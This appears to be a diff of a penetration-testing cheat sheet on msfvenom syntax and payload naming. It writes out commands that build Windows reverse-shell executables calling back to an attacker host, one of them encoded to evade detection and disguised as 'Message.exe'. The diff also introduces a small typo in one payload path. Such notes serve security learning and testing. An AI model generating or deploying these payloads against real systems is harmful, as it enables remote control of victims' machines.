@@ -1,24 +1,29 @@
-    **STANDARD SYNTAX**  
+
   
-msfvenom -p <payload> <options>  
-  
-_Ex:_ msfvenom -p windows/x64/shell/reverse\_tcp -f exe -o shell.exe LHOST=<ip> LPORT=<port>
+msfvenom -p payload options
+
+Examples:
+ 
+`msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ip LPORT=port`
+
+	
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe -o Message.exe`
 	
 	
 ---
 	
     **PAYLOAD NAMING CONVENTIONS**  
   
-<OS> / <arch> / <payload>  
+OS / architecture / payload
   
 _ex: linux/x86/shell\_reverse\_tcp_  
   
   
 Windows 32 arch is not specified  
-_/windows/shell\_reverse\_tcp_  
+/windows/shell_reverse_tcp
   
 64 bit windows is specified as x64  
-_windows/x64/shell\_reverse\_tcp_  
+_indows/x64/shell_reverse_tcp_ 
   
   
 \* Stageless payloads are denoted with \_  
